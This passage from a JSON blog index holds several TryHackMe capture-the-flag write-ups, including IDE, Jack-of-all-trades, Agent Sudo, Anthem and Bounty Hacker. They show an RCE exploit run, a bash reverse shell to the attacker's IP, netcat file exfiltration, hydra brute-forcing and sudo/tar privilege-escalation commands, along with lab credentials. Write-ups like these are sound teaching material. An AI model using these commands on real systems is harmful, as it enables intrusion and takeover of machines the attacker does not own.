seconds\\n------------------------------------------------------------\\n```\\n\\n## Gobuster results\\n\\n```bash\\n\\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/THM/IDE]\\n\u2514\u2500$ gobuster dir -u http://10.10.86.172 -w /usr/share/wordlists/dirb/common.txt -t 30 2>/dev/null\\n===============================================================\\nGobuster v3.1.0\\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\\n===============================================================\\n[+] Url:                     http://10.10.86.172\\n[+] Method:                  GET\\n[+] Threads:                 30\\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\\n[+] Negative Status codes:   404\\n[+] User Agent:              gobuster/3.1.0\\n[+] Timeout:                 10s\\n===============================================================\\n2021/10/19 12:35:23 Starting gobuster in directory enumeration mode\\n===============================================================\\n/.htpasswd            (Status: 403) [Size: 277]\\n/.hta                 (Status: 403) [Size: 277]\\n/.htaccess            (Status: 403) [Size: 277]\\n/index.html           (Status: 200) [Size: 10918]\\n/server-status        (Status: 403) [Size: 277]\\n===============================================================\\n2021/10/19 12:35:53 Finished\\n===============================================================\\n```\\n\\n--\x3e Got this in File named `-` in FTP\\n\\n```bash\\nHey john,\\nI have reset the password as you have asked. Please use the default password to login.\\nAlso, please take care of the image file ;)\\n- drac.\\n\\n```\\n\\n--\x3e I found the login page at the port `62337`\\n\\n## Gobuster results for port 62337\\n\\n```bash\\n===============================================================\\nGobuster v3.1.0\\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\\n===============================================================\\n[+] Url:                     http://10.10.86.172:62337\\n[+] Method:                  GET\\n[+] Threads:                 30\\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\\n[+] Negative Status codes:   404\\n[+] User Agent:              gobuster/3.1.0\\n[+] Timeout:                 10s\\n===============================================================\\n2021/10/19 12:44:19 Starting gobuster in directory enumeration mode\\n===============================================================\\n/.hta                 (Status: 403) [Size: 280]\\n/.htpasswd            (Status: 403) [Size: 280]\\n/.htaccess            (Status: 403) [Size: 280]\\n/components           (Status: 301) [Size: 326] [--\x3e http://10.10.86.172:62337/components/]\\n/data                 (Status: 301) [Size: 320] [--\x3e http://10.10.86.172:62337/data/]\\n/favicon.ico          (Status: 200) [Size: 1150]\\n/index.php            (Status: 200) [Size: 5239]\\n/js                   (Status: 301) [Size: 318] [--\x3e http://10.10.86.172:62337/js/]\\n/languages            (Status: 301) [Size: 325] [--\x3e http://10.10.86.172:62337/languages/]\\n/lib                  (Status: 301) [Size: 319] [--\x3e http://10.10.86.172:62337/lib/]\\n/plugins              (Status: 301) [Size: 323] [--\x3e http://10.10.86.172:62337/plugins/]\\n/server-status        (Status: 403) [Size: 280]\\n/themes               (Status: 301) [Size: 322] [--\x3e http://10.10.86.172:62337/themes/]\\n===============================================================\\n2021/10/19 12:45:04 Finished\\n===============================================================\\n```\\n\\n## Enumeration\\n\\n--\x3e i tried default credentials but it didn\'t worked then i tried `john:password` and i got logged in !\\n\\n--\x3e I also found one exploit for RCE in codiac `2.8.4`\\n\\n- https://www.exploit-db.com/exploits/49705\\n\\n--\x3e I used this command\\n\\n```bash\\npython exploit.py http://10.10.86.172:62337/ john password 10.9.4.105 4444 linux\\necho \'bash -c \\"bash -i >/dev/tcp/10.9.4.105/4445 0>&1 2>&1\\"\' | nc -lnvp 4444\\nnc -lnvp 4445\\n```\\n\\n--\x3e And i got the reverse shell !\\n\\n## Privesc\\n\\nAfter that i searched for the password for user `drac` but i didn\'t found anything. but after some time i found one command in `.bash_history`\\n\\n![](Attachments/Pastedimage20211019141311.png)\\n\\n--\x3e it might be a ssh password because mysql is not running on this machine!\\n\\nAnd i tried this password for drac and got the SSH shell !\\n\\n`drac:Th3dRaCULa1sR3aL`\\n\\n--\x3e I found some SUID files and in that files i found `/usr/bin/pkexec` vulnertable to configuration files\\n\\nThen i followed this article and got the root shell :\\n\\nhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe\\n\\n![](Attachments/Pastedimage20211019150647.png)\\n\\n---\\n\\n## Resources\\n\\n- https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit\\n- https://www.youtube.com/watch?v=RL0Pkoge-xI\\n- https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe"},{"id":"jack-of-all-trades","metadata":{"permalink":"/Cybernotes/blog/jack-of-all-trades","source":"@site/blog/2022-03-02-JackofAllTrades/jackofAllTrades.md","title":"THM Jack-of-all-trades writeup","description":"Tryhackme Jack-of-all-trades room writeup","date":"2022-03-02T00:00:00.000Z","formattedDate":"March 2, 2022","tags":[{"label":"stegnography","permalink":"/Cybernotes/blog/tags/stegnography"},{"label":"strings","permalink":"/Cybernotes/blog/tags/strings"},{"label":"SUID","permalink":"/Cybernotes/blog/tags/suid"}],"readingTime":3.485,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"THM Jack-of-all-trades writeup","description":"Tryhackme Jack-of-all-trades room writeup","authors":["shivam"],"image":"https://tryhackme-images.s3.amazonaws.com/room-icons/baa244c10b8308efe5d3956cc1c73db6.jpeg","slug":"jack-of-all-trades","tags":["stegnography","strings","SUID"]},"prevItem":{"title":"THM IDE writeup","permalink":"/Cybernotes/blog/ide"},"nextItem":{"title":"THM Agent sudo writeup","permalink":"/Cybernotes/blog/agent-sudo"}},"content":"Hello everyone,\\n\\nToday we are going to solve Jack-of-all-trades machine from tryhackme. we will learn about how to open restricted port on browser,some stegnography and how to do privesc with strings SUID.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/baa244c10b8308efe5d3956cc1c73db6.jpeg)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```bash\\nPORT   STATE SERVICE VERSION\\n22/tcp open  http    Apache httpd 2.4.10 ((Debian))\\n|_http-server-header: Apache/2.4.10 (Debian)\\n|_http-title: Jack-of-all-trades!\\n|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)\\n80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)\\n| ssh-hostkey:\\n|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)\\n|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)\\n|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)\\n|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n```\\n\\n--\x3e If you are facing the problem with firefox about restricted port so here is the quick guide to help you :\\n\\n1.open a new tab and search for `about:config`\\n2.Then you will see one search bar. Type `network.security.ports.banned.override` and if it appears then double click on it and add the port which you want to allow(in our case 22)\\n3.If it doesn\'t appear then make one new by clicking on `+` icon and select type as integer and add `22` in it and save it and you are good to go!\\n\\nAfter configuration it will look like this !\\n\\n![](Attachments/Pastedimage20220109125326.png)\\n\\n--\x3e Now we can goto that port and i found this page there !\\n\\n![](Attachments/Pastedimage20220109125419.png)\\n\\n## Gobuster results\\n\\n```bash\\n===============================================================\\n/.htpasswd            (Status: 403) [Size: 278]\\n/.htaccess            (Status: 403) [Size: 278]\\n/assets               (Status: 301) [Size: 318] [--\x3e http://10.10.223.122:22/assets/]\\n/index.html           (Status: 200) [Size: 1605]\\n/server-status        (Status: 403) [Size: 278]\\n===============================================================\\n```\\n\\n## Enumration\\n\\n--\x3e Found this in the comment of the page on port `22`\\n\\n```bash\\nRemember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq\\n```\\n\\nPossible name : `Johny`\\nalso got one password : `u?WtKSraq`\\n\\n--\x3e Also got this in comment :\\n\\n```bash\\nNote to self - If I ever get locked out I can get back in at /recovery.php\\n```\\n\\n--\x3e Got this page in `/recovery.php`\\n\\n![](Attachments/Pastedimage20220109120648.png)\\n\\n--\x3e Also in comment i found this string:\\n\\n![](Attachments/Pastedimage20220109120618.png)\\n\\n```bash\\nRemember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here\'s a hint: bit.ly/2TvYQ2S\\n```\\n\\n--\x3e The link redirects us to the wikipedia page for `Stegosauria` so here we have to do some stegnography.\\n\\n--\x3e I went to `/assets` and found 3 images: `header.jpg`,`stego.jpg` and `jackinthebox.jpg`. So let\'s do stego on them one by one!\\n\\n--\x3e Found the creds from `header.jpg` by stego using `u?WtKSraq` as password !\\n\\n```bash\\nHere you go Jack. Good thing you thought ahead!\\n\\nUsername: jackinthebox\\nPassword: TplFxiSHjY\\n```\\n\\n--\x3e Found this in `stego.jpg` using same password as `header.jpg`\\n\\n```bash\\nHehe. Gotcha!\\n\\nYou\'re on the right path, but wrong image!\\n```\\n\\nBut we already found username and password so let\'s try to login on `/recovery.php`\\n\\n--\x3e And boom it worked!\\n\\nAnd i found the page which says this :\\n\\n```bash\\nGET me a \'cmd\' and I\'ll run it for you Future-Jack.\\n```\\n\\n--\x3e So i tried `cmd` as parameter and it worked ! So i tried to get the reverse shell with that parameter and i got the shell as `www-data`\\n\\n![](Attachments/Pastedimage20220109121928.png)\\n\\n--\x3e In `/home` directory i found one file called `jacks_password_list` so it might be a ssh passwords of jack so i grabbed them and ran hydra\\n\\n```bash\\nhydra -l jack -P jacks_password_list.txt ssh://<ip>:80 -t 10\\n```\\n\\n--\x3e Found jack\'s password !\\n\\n![](Attachments/Pastedimage20220109122405.png)\\n\\n`jack:ITMJpGGIqg1jn?>@`\\n\\n--\x3e But we don\'t have user flag here! instead we have one image so let\'s transfer this using netcat into our machine !\\n\\n```bash\\n#Victim machine\\nnc <attacker_ip> <port> < user.jpg\\n\\n#Attacker machine\\nnc -lp <port> > user.jpg\\n```\\n\\n--\x3e After opening the image i found the flag !\\n\\n![](Attachments/Pastedimage20220109124032.png)\\n\\n## Privesc\\n\\n--\x3e I done `sudo -l` but found nothing so i tried to find the `SUID` files with this command :\\n\\n```bash\\nfind / -perm -u=s -type f 2>/dev/null\\n```\\n\\n--\x3e And i found some files in which `/usr/bin/strings` looks interesting !\\n\\n![](Attachments/Pastedimage20220109124226.png)\\n\\n--\x3e So i searched on gtfobins and i found that we can read any file with strings so let\'s read `/root/root.txt` with it !\\n\\n```bash\\nLFILE=/root/root.txt\\n/usr/bin/strings \\"$LFILE\\"\\n```\\n\\n--\x3e And i found the root flag!\\n\\n![](Attachments/Pastedimage20220109124346.png)"},{"id":"agent-sudo","metadata":{"permalink":"/Cybernotes/blog/agent-sudo","source":"@site/blog/2022-02-27-Agent-Sudo/index.md","title":"THM Agent sudo writeup","description":"Tryhackme Agent-sudo room writeup","date":"2022-02-27T00:00:00.000Z","formattedDate":"February 27, 2022","tags":[{"label":"stegnography","permalink":"/Cybernotes/blog/tags/stegnography"},{"label":"zip2john","permalink":"/Cybernotes/blog/tags/zip-2-john"},{"label":"user-agent","permalink":"/Cybernotes/blog/tags/user-agent"}],"readingTime":2.58,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"agent-sudo","title":"THM Agent sudo writeup","description":"Tryhackme Agent-sudo room writeup","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png","authors":["shivam"],"tags":["stegnography","zip2john","user-agent"]},"prevItem":{"title":"THM Jack-of-all-trades writeup","permalink":"/Cybernotes/blog/jack-of-all-trades"},"nextItem":{"title":"THM Anthem writeup","permalink":"/Cybernotes/blog/anthem"}},"content":"Hello everyone,\\n\\nToday we are going to solve agent sudo room from Tryhackme. we will learn about user-agent, zip2john and CVE-2019-14287\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## nmap results\\n\\n```bash\\nPORT STATE SERVICE VERSION\\n21/tcp open ftp vsftpd 3.0.3\\n22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n| 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\\n| 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\\n|\\\\_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\\n80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\\n|\\\\_http-server-header: Apache/2.4.29 (Ubuntu)\\n|\\\\_http-title: Annoucement\\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\\n```\\n\\n---\\n\\n## dirsearch results\\n\\n```bash\\n[10:34:41] 200 - 218B - /index.php\\n[10:34:52] 403 - 277B - /server-status\\n```\\n\\n---\\n\\n--\x3e got this in default page :\\n\\n![](Attachments/Pastedimage20210709110809.png)\\n\\n--\x3e after reading hint i know that we have to change the user agent to C so i tried it and found another text on thich i got the username of agent C\\n\\n![](Attachments/Pastedimage20210709111333.png)\\n\\n---\\n\\n## FTP\\n\\n--\x3e Let\'s brute force the password of FTP using hydra\\n\\n```c\\nhydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.34.127\\n```\\n\\n--\x3e i got the password for chris\\n\\n![](Attachments/Pastedimage20210709111737.png)\\n\\n--\x3e i got this files in ftp\\n\\n![](Attachments/Pastedimage20210709111958.png)\\n\\n--\x3e got this in To_AgentJ file\\n\\n```\\nDear agent J,\\n\\nAll these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\'t be a problem for you.\\n\\nFrom,\\nAgent C\\n```\\n\\n---\\n\\n## Stegnography\\n\\n--\x3e i used binwalk to extract the data of cutie.png and found some files\\n\\n![](Attachments/Pastedimage20210709114136.png)\\n\\n--\x3e let\'s extract these files using -e flag\\n\\n```\\nbinwalk -e cutie.png\\n```\\n\\n--\x3e for this we have to locate zip2john which is similar to ssh2john so Let\'s run this and store the output in decrypted file !\\n\\n```\\nlocate zip2john\\n/usr/sbin/zip2john 8702.zip > decrypted\\njohn --wordlist=/usr/share/wordlist/rockyou.txt decrypted\\n```\\n\\n--\x3e and i got the password !\\n\\n![](Attachments/Pastedimage20210709114952.png)\\n\\n--\x3e i found this txt file after extracting the zip file !\\n\\n```\\nAgent C,\\n\\nWe need to send the picture to \'QXJlYTUx\' as soon as possible!\\n\\nBy,\\nAgent R\\n```\\n\\n--\x3e after decrypting that word i found the stego password which was Area51\\n\\n![](Attachments/Pastedimage20210709115315.png)\\n\\n--\x3e i got message.txt file with that passphrase so Let\'s read that file !\\n\\n![](Attachments/Pastedimage20210709115700.png)\\n\\n![](Attachments/Pastedimage20210709115717.png)\\n\\n--\x3e and i got the ssh password for james in that file !\\n\\n```\\nHi james,\\n\\nGlad you find this message. Your login password is hackerrules!\\n\\nDon\'t ask me why the password look cheesy, ask agent R who set this password for you.\\n\\nYour buddy,\\nchris\\n```\\n\\n---\\n\\n## Image stegno\\n\\n--\x3e i got this image in home directory\\n\\n![](Attachments/Pastedimage20210709122756.png)\\n\\n--\x3e then i watched hint and found one article on foxnews.com\\n\\n![](Attachments/Pastedimage20210709122855.png)\\n\\n--\x3e so we answered all questions so let\'s do privesc now !\\n\\n---\\n\\n## Privesc\\n\\n--\x3e first of all i done sudo -l and found one interesting thing :\\n\\n![](Attachments/Pastedimage20210709123801.png)\\n\\n--\x3e this line looks weird so i copied it and pasted it on google and found one exploit for this on exploitdb.com\\n\\n![](Attachments/Pastedimage20210709123848.png)\\n\\n--\x3e also i got CVE number from exploit-db\\n\\n![](Attachments/Pastedimage20210709123923.png)\\n\\n--\x3e so the exploit was like :\\n\\n```\\nsudo -u#-1 /bin/bash\\n```\\n\\n--\x3e and i got root shell !\\n\\n---"},{"id":"anthem","metadata":{"permalink":"/Cybernotes/blog/anthem","source":"@site/blog/2022-02-27-Anthem/index.md","title":"THM Anthem writeup","description":"Tryhackme Anthem room writeup","date":"2022-02-27T00:00:00.000Z","formattedDate":"February 27, 2022","tags":[{"label":"OSINT","permalink":"/Cybernotes/blog/tags/osint"},{"label":"windows","permalink":"/Cybernotes/blog/tags/windows"}],"readingTime":2.8,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"anthem","title":"THM Anthem writeup","description":"Tryhackme Anthem room writeup","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/d3387857fc40a19afd406e7034e0bfa0.gif","tags":["OSINT","windows"],"authors":["shivam"]},"prevItem":{"title":"THM Agent sudo writeup","permalink":"/Cybernotes/blog/agent-sudo"},"nextItem":{"title":"THM Bounty Hacker","permalink":"/Cybernotes/blog/bounty-hacker"}},"content":"Hello everyone,\\n\\nToday we are going to solve anthem machine from Tryhackme. we will learn about IAM in windows and some OSINT.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/d3387857fc40a19afd406e7034e0bfa0.gif)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap\\n\\n--\x3e This website was using firewall that\'s why `nmap -sSCV` didn\'t worked!\\n\\n```bash\\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 13:17 EDT\\nNmap scan report for 10.10.190.134 (10.10.190.134)\\nHost is up (0.16s latency).\\nNot shown: 998 filtered ports\\nPORT     STATE SERVICE\\n80/tcp   open  http\\n3389/tcp open  ms-wbt-server\\n\\nNmap done: 1 IP address (1 host up) scanned in 12.51 seconds\\n```\\n\\n#### Q.1 What port is for the web server?\\n\\n--\x3e 80\\n\\n#### Q.2 What port is for remote desktop service?\\n\\n--\x3e 3389\\n\\n---\\n\\n## Gobuster\\n\\n```c\\n===============================================================\\nGobuster v3.1.0\\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\\n===============================================================\\n[+] Url:                     http://10.10.190.134/\\n[+] Method:                  GET\\n[+] Threads:                 30\\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\\n[+] Negative Status codes:   404\\n[+] User Agent:              gobuster/3.1.0\\n[+] Timeout:                 10s\\n===============================================================\\n2021/10/09 13:30:30 Starting gobuster in directory enumeration mode\\n===============================================================\\n/archive              (Status: 301) [Size: 118] [--\x3e /]\\n/Archive              (Status: 301) [Size: 118] [--\x3e /]\\n/authors              (Status: 200) [Size: 4075]\\n/Blog                 (Status: 200) [Size: 5399]\\n/blog                 (Status: 200) [Size: 5399]\\n/categories           (Status: 200) [Size: 3546]\\n/install              (Status: 302) [Size: 126] [--\x3e /umbraco/]\\n/robots.txt           (Status: 200) [Size: 192]\\n/RSS                  (Status: 200) [Size: 1877]\\n/rss                  (Status: 200) [Size: 1877]\\n/Search               (Status: 200) [Size: 3472]\\n/search               (Status: 200) [Size: 3472]\\n/sitemap              (Status: 200) [Size: 1047]\\n/SiteMap              (Status: 200) [Size: 1047]\\n/tags                 (Status: 200) [Size: 3599]\\n/umbraco              (Status: 200) [Size: 4078]\\n===============================================================\\n2021/10/09 13:40:30 Finished\\n===============================================================\\n```\\n\\n#### Q.3 What is a possible password in one of the pages web crawlers check for?\\n\\n--\x3e Found this on `robots.txt`\\n\\n![](Attachments/Pastedimage20211009143751.png)\\n\\n`UmbracoIsTheBest!`\\n\\n#### Q.4 What CMS is the website using?\\n\\n--\x3e Found this in the source code of `/umbraco` directory\\n\\n![](Attachments/Pastedimage20211009135318.png)\\n\\n#### Q.5 What is the domain of the website?\\n\\n--\x3e Found the domain name in the website itself\\n\\n![](Attachments/Pastedimage20211009144904.png)\\n\\n#### Q.6 What\'s the name of the Administrator?\\n\\n--\x3e I got this poem in one of the blogs\\n\\n![](Attachments/Pastedimage20211009143333.png)\\n\\nAfter googling it i found the author/admin name : `Solomon Grundy`\\n\\n![](Attachments/Pastedimage20211009143432.png)\\n\\n#### Q.7 Can we find find the email address of the administrator?\\n\\n--\x3e I found the email of the admin by this reference `SG@anthem.com`\\n\\n![](Attachments/Pastedimage20211009143303.png)\\n\\n---\\n\\n## Spot the flags\\n\\n### Flag 1:\\n\\n![](Attachments/Pastedimage20211009132551.png)\\n--\x3e `THM{L0L_WH0_US3S_M3T4}`\\n\\n### Flag 2:\\n\\n![](Attachments/Pastedimage20211009132316.png)\\n--\x3e `THM{G!T_G00D}`\\n\\n### Flag 3:\\n\\n![](Attachments/Pastedimage20211009132810.png)\\n--\x3e `THM{L0L_WH0_D15}`\\n\\n### Flag 4:\\n\\n![](Attachments/Pastedimage20211009132237.png)\\n--\x3e `THM{AN0TH3R_M3TA}`\\n\\n---\\n\\n## Final stage\\n\\n#### Q.1 Let\'s figure out the username and password to log in to the box.(The box is not on a domain)\\n\\n--\x3e i tried the username as `sg` and password `UmbracoIsTheBest!`\\n\\nFound one file in `backup` folder which was hidden(To enable hidden files and folders goto search -> `Show hidden files & folders` -> `Tick the enable` -> apply)\\n\\nbut we don\'t have permission to read so let\'s change the permissions\\n\\n![](Attachments/Pastedimage20211009150500.png)\\n\\n--\x3e To enable permissions Right click on file -> Properties -> security -> edit -> Add -> enter the name (Here `sg`) and then check usernames -> then give full control -> apply\\n\\nand then i got the password for admin!\\n\\n![](Attachments/Pastedimage20211009150621.png)\\n\\n`ChangeMeBaby1MoreTime`\\n\\n--\x3e Let\'s open the terminal with administrator by right click -> `Run as administrator`\\n\\nAnd we got root shell!\\n\\n![](Attachments/Pastedimage20211009151054.png)\\n\\n#### Escalate your privileges to root, what is the contents of root.txt?\\n\\ni got the `root.txt` in `/Desktop` directory of administrator user\\n\\n![](Attachments/Pastedimage20211009151233.png)\\n\\n`THM{Y0U_4R3_1337}`"},{"id":"bounty-hacker","metadata":{"permalink":"/Cybernotes/blog/bounty-hacker","source":"@site/blog/2022-02-27-Bounty-Hunter/index.md","title":"THM Bounty Hacker","description":"Tryhackme Bounty Hacker writeup","date":"2022-02-27T00:00:00.000Z","formattedDate":"February 27, 2022","tags":[{"label":"hydra","permalink":"/Cybernotes/blog/tags/hydra"},{"label":"FTP","permalink":"/Cybernotes/blog/tags/ftp"},{"label":"tar","permalink":"/Cybernotes/blog/tags/tar"}],"readingTime":1.86,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"bounty-hacker","title":"THM Bounty Hacker","description":"Tryhackme Bounty Hacker writeup","authors":["shivam"],"image":"https://tryhackme-images.s3.amazonaws.com/room-icons/9ad38a2cc31d6ae0030c888aca7fe646.jpeg","tags":["hydra","FTP","tar"]},"prevItem":{"title":"THM Anthem writeup","permalink":"/Cybernotes/blog/anthem"},"nextItem":{"title":"THM Brooklyn writeup","permalink":"/Cybernotes/blog/Brooklyn"}},"content":"Hello everyone,\\n\\nToday we are going to solve Bounty hacker room from tryhackme. we will learn about hydra,FTP enumration and how to get root shell with tar.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/9ad38a2cc31d6ae0030c888aca7fe646.jpeg)\\n\\n\x3c!--truncate--\x3e\\n\\n--\x3e default page\\n\\n![](Attachments/Pastedimage20210702101906.png)\\n\\n---\\n\\n## Nmap results\\n\\n```bash\\nPORT STATE SERVICE VERSION\\n--\x3e21/tcp open ftp vsftpd 3.0.3\\n| ftp-anon: `Anonymous FTP login allowed` (FTP code 230)\\n| -rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt\\n|_-rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt\\n| ftp-syst:\\n| STAT:\\n| FTP server status:\\n| Connected to ::ffff:10.9.3.179\\n| Logged in as ftp\\n| TYPE: ASCII\\n| No session bandwidth limit\\n| Session timeout in seconds is 300\\n| Control connection is plain text\\n| Data connections will be plain text\\n| At session startup, client count was 2\\n| vsFTPd 3.0.3 - secure, fast, stable\\n|\\\\_End of status\\n--\x3e22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 0)\\n| ssh-hostkey:\\n| 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)\\n| 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)\\n|_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)\\n--\x3e80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\\n|\\\\_http-server-header: Apache/2.4.18 (Ubuntu)\\n|\\\\_http-title: Site doesn\'t have a title (text/html).\\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\\n```\\n\\n---\\n\\n## gobuster results\\n\\n```bash\\n[10:21:10] 301 - 315B - /images -> http://10.10.221.156/images/ > [10:21:10] 200 - 969B - /index.html\\n[10:21:23] 403 - 278B - /server-status\\n```\\n\\n---\\n\\n## FTP\\n\\n--\x3e so Let\'s try to login as ftp because anonymous login is allowed.\\n--\x3e and we got 2 files `task.txt and locks.txt` so Let\'s try to read that file and Let\'s see what we get !\\n\\n![](Attachments/Pastedimage20210702102957.png)\\n\\n--\x3e i got this in locks.txt\\n\\n![](Attachments/Pastedimage20210702103122.png)\\n\\n--\x3e i think it\'s some type of wordlist so Let\'s read another file\\n\\n> 1.) Protect Vicious.\\n> 2.) Plan for Red Eye pickup on the moon.\\n> -lin\\n\\n---\\n\\n## brute force\\n\\n--\x3e I tried to do brute force with user lin and i found the password\\n\\n![](Attachments/Pastedimage20210702103651.png)\\n\\n==> Let\'s try to login with SSH\\n\\n--\x3e and i got user.txt in `/Desktop`\\n\\n![](Attachments/Pastedimage20210702103845.png)\\n\\n--\x3e So Let\'s try to escalate our privileges !\\n\\n---\\n\\n## Privesc\\n\\n--\x3e i done `sudo -l` and found that we can run `/bin/tar` as a root\\n\\n![](Attachments/Pastedimage20210702104209.png)\\n\\n--\x3e and i got root with this command\\n\\n```\\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\\n```\\n\\n![](Attachments/Pastedimage20210702104549.png)"},{"id":"Brooklyn","metadata":{"permalink":"/Cybernotes/blog/Brooklyn","source":"@site/blog/2022-02-27-Brooklyn-Nine-Nine/Brooklyn.md","title":"THM Brooklyn writeup","description":"Tryhackme Brooklyn nine nine writeup","date":"2022-02-27T00:00:00.000Z","formattedDate":"February 27, 2022","tags":[{"label":"stegnography","permalink":"/Cybernotes/blog/tags/stegnography"},{"label":"nano","permalink":"/Cybernotes/blog/tags/nano"},{"label":"stegseek","permalink":"/Cybernotes/blog/tags/stegseek"}],"readingTime":1.7,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"THM Brooklyn writeup","description":"Tryhackme Brooklyn nine nine writeup","slug":"Brooklyn","authors":["shivam"],"image":"https://tryhackme-images.s3.amazonaws.com/room-icons/95b2fab20e29a6d22d6191a789dcbe1f.jpeg","tags":["stegnography","nano","stegseek"]},"prevItem":{"title":"THM Bounty Hacker","permalink":"/Cybernotes/blog/bounty-hacker"},"nextItem":{"title":"THM Brute-it writeup","permalink":"/Cybernotes/blog/bruteit"}},"content":"Hello everyone,\\n\\nToday we are going to solve Brooklyn nine nine room from tryhackme. we will learn about stegseek to brute force stego password and privilege escalation with nano\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/95b2fab20e29a6d22d6191a789dcbe1f.jpeg)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results:\\n\\n```c\\nPORT   STATE SERVICE VERSION\\n21/tcp open  ftp     vsftpd 3.0.3\\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\\n|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt\\n| ftp-syst:\\n|   STAT:\\n| FTP server status:\\n|      Connected to ::ffff:10.9.2.206\\n|      Logged in as ftp\\n|      TYPE: ASCII\\n|      No session bandwidth limit\\n|      Session timeout in seconds is 300\\n|      Control connection is plain text\\n|      Data connections will be plain text\\n|      At session startup, client count was 4\\n|      vsFTPd 3.0.3 - secure, fast, stable\\n|_End of status\\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)\\n|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)\\n|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)\\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\\n|_http-server-header: Apache/2.4.29 (Ubuntu)\\n|_http-title: Site doesn\'t have a title (text/html).\\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\\n```\\n\\n---\\n\\n## Gobuster results\\n\\n--\x3e i got nothing in gobuster :/\\n\\n---\\n\\n## FTP\\n\\n--\x3e Got this on ftp\\n\\n```bash\\nFrom Amy,\\n\\nJake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine\\n\\n```\\n\\n---\\n\\n## Port 80\\n\\n--\x3e I got this page on port 80\\n\\n![](Attachments/Pastedimage20211103141603.png)\\n\\n--\x3e I got this comment in source code 